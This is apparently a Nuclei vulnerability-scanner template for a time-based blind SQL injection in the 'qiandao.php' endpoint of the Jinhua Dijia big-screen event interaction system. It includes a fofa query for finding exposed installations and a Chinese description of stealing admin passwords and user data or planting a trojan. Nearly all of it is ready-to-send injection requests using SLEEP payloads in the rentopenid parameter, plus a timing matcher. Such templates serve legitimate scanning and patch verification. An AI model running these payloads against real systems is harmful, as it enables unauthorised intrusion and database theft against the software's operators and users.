id: jinhuadijia-qiandao-sql

info:
  name: 金华迪加 现场大屏互动系统 qiandao.php SQL注入
  author: HuanXiong
  severity: high
  description: |-
    fofa: body="/wall/themes/meepo/assets/images/defaultbg.jpg" || title="现场活动大屏幕系统"
    金华迪加 现场大屏互动系统 qiandao接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - 
  tags: sql injection

http:
  - raw:
      - |-
        GET /mobile/qiandao.php?rentopenid=1"+AND+(SELECT+*+FROM+(SELECT(SLEEP(2)))x)--+ HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json, text/javascript, */*; q=0.01
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate

      - |-
        GET /mobile/qiandao.php?rentopenid=1"+AND+(SELECT+*+FROM+(SELECT(SLEEP(4)))x)--+ HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json, text/javascript, */*; q=0.01
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate

    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - "status_code == 200 && duration_1>=4 && duration_1<=5 && duration_2>=8 && duration_2<=9"
